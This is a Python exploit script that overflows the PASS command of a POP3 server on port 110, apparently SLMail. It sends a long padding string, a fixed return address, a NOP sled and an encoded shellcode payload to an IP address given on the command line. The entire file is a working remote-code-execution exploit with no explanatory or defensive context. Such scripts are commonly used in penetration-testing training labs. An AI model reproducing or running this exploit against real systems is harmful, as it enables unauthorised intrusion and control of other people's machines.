#!/usr/bin/env python
#coding: utf-8

from pwn import *
from struct import pack
import socket, sys

if len(sys.argv) < 2:
        print '\n[!] Usage: python ' + sys.argv[0] + ' <ip-address>\n'
        sys.exit(0)

# Global variables
ip_address = sys.argv[1]
rport = 110

if __name__ == '__main__':

    buf =  b""
    buf += b"\xbe\x44\x01\x71\xea\xd9\xcf\xd9\x74\x24\xf4\x58\x33"
    buf += b"\xc9\xb1\x52\x83\xc0\x04\x31\x70\x0e\x03\x34\x0f\x93"
    buf += b"\x1f\x48\xe7\xd1\xe0\xb0\xf8\xb5\x69\x55\xc9\xf5\x0e"
    buf += b"\x1e\x7a\xc6\x45\x72\x77\xad\x08\x66\x0c\xc3\x84\x89"
    buf += b"\xa5\x6e\xf3\xa4\x36\xc2\xc7\xa7\xb4\x19\x14\x07\x84"
    buf += b"\xd1\x69\x46\xc1\x0c\x83\x1a\x9a\x5b\x36\x8a\xaf\x16"
    buf += b"\x8b\x21\xe3\xb7\x8b\xd6\xb4\xb6\xba\x49\xce\xe0\x1c"
    buf += b"\x68\x03\x99\x14\x72\x40\xa4\xef\x09\xb2\x52\xee\xdb"
    buf += b"\x8a\x9b\x5d\x22\x23\x6e\x9f\x63\x84\x91\xea\x9d\xf6"
    buf += b"\x2c\xed\x5a\x84\xea\x78\x78\x2e\x78\xda\xa4\xce\xad"
    buf += b"\xbd\x2f\xdc\x1a\xc9\x77\xc1\x9d\x1e\x0c\xfd\x16\xa1"
    buf += b"\xc2\x77\x6c\x86\xc6\xdc\x36\xa7\x5f\xb9\x99\xd8\xbf"
    buf += b"\x62\x45\x7d\xb4\x8f\x92\x0c\x97\xc7\x57\x3d\x27\x18"
    buf += b"\xf0\x36\x54\x2a\x5f\xed\xf2\x06\x28\x2b\x05\x68\x03"
    buf += b"\x8b\x99\x97\xac\xec\xb0\x53\xf8\xbc\xaa\x72\x81\x56"
    buf += b"\x2a\x7a\x54\xf8\x7a\xd4\x07\xb9\x2a\x94\xf7\x51\x20"
    buf += b"\x1b\x27\x41\x4b\xf1\x40\xe8\xb6\x92\xae\x45\xb8\x72"
    buf += b"\x47\x94\xb8\x71\x70\x11\x5e\x1f\x6e\x74\xc9\x88\x17"
    buf += b"\xdd\x81\x29\xd7\xcb\xec\x6a\x53\xf8\x11\x24\x94\x75"
    buf += b"\x01\xd1\x54\xc0\x7b\x74\x6a\xfe\x13\x1a\xf9\x65\xe3"
    buf += b"\x55\xe2\x31\xb4\x32\xd4\x4b\x50\xaf\x4f\xe2\x46\x32"
    buf += b"\x09\xcd\xc2\xe9\xea\xd0\xcb\x7c\x56\xf7\xdb\xb8\x57"
    buf += b"\xb3\x8f\x14\x0e\x6d\x79\xd3\xf8\xdf\xd3\x8d\x57\xb6"
    buf += b"\xb3\x48\x94\x09\xc5\x54\xf1\xff\x29\xe4\xac\xb9\x56"
    buf += b"\xc9\x38\x4e\x2f\x37\xd9\xb1\xfa\xf3\xf9\x53\x2e\x0e"
    buf += b"\x92\xcd\xbb\xb3\xff\xed\x16\xf7\xf9\x6d\x92\x88\xfd"
    buf += b"\x6e\xd7\x8d\xba\x28\x04\xfc\xd3\xdc\x2a\x53\xd3\xf4"

    bufer = "A"*2606 + pack("<L", 0x5F4A358F) + "\x90"*16  + buf

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_address, rport))

        s.recv(1024)

        s.send("USER zerocool\r\n")
        s.recv(1024)
        s.send("PASS" + bufer + '\r\n')
        s.recv(1024)
    except:
        print "\n[!] An error has occurred. Failed conection\n"
        sys.exit(1)
